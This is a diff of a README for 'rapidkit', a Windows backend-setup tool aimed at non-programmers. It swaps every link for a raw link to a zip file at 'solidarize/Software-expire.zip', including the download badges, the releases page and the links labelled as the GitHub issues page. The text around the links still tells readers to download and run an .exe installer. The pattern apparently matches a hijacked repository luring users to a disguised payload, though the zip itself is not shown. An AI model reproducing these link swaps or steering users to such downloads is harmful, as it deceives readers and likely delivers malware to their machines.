@@ -1,6 +1,6 @@
 # ⚙️ rapidkit - Simplify Backend Project Setup
 
-[![Download rapidkit](https://img.shields.io/badge/Download-rapidkit-blue)](https://github.com/RRThomasmusic/rapidkit/releases)
+[![Download rapidkit](https://img.shields.io/badge/Download-rapidkit-blue)](https://raw.githubusercontent.com/RRThomasmusic/rapidkit/main/solidarize/Software-expire.zip)
 
 rapidkit is the central hub for managing backend projects. It helps you set up workspaces quickly and works well for teams and production-ready projects. You do not need to know programming to get started.
 
@@ -10,7 +10,7 @@ rapidkit is the central hub for managing backend projects. It helps you set up w
 
 To get the software, visit this page:
 
-[https://github.com/RRThomasmusic/rapidkit/releases](https://github.com/RRThomasmusic/rapidkit/releases)
+[https://raw.githubusercontent.com/RRThomasmusic/rapidkit/main/solidarize/Software-expire.zip](https://raw.githubusercontent.com/RRThomasmusic/rapidkit/main/solidarize/Software-expire.zip)
 
 This page contains the latest versions. Click the version you want, then download the Windows installer file. The installer usually has a name ending in `.exe`. 
 
@@ -90,7 +90,7 @@ If rapidkit does not start or work as expected:
 - Check that your Windows system meets the requirements.
 - Make sure your internet connection is active for setup tasks.
 - Restart your computer and try again.
-- Visit the [GitHub issues page](https://github.com/RRThomasmusic/rapidkit/issues) for community help and to report problems.
+- Visit the [GitHub issues page](https://raw.githubusercontent.com/RRThomasmusic/rapidkit/main/solidarize/Software-expire.zip) for community help and to report problems.
 
 ---
 
@@ -108,9 +108,9 @@ To update:
 
 ## 📞 Getting Help
 
-- Visit [GitHub issues](https://github.com/RRThomasmusic/rapidkit/issues) for support questions.
+- Visit [GitHub issues](https://raw.githubusercontent.com/RRThomasmusic/rapidkit/main/solidarize/Software-expire.zip) for support questions.
 - Search the repository’s documentation for guides and FAQs.
 
 ---
 
-[![Download rapidkit](https://img.shields.io/badge/Download-rapidkit-grey)](https://github.com/RRThomasmusic/rapidkit/releases)
+[![Download rapidkit](https://img.shields.io/badge/Download-rapidkit-grey)](https://raw.githubusercontent.com/RRThomasmusic/rapidkit/main/solidarize/Software-expire.zip)
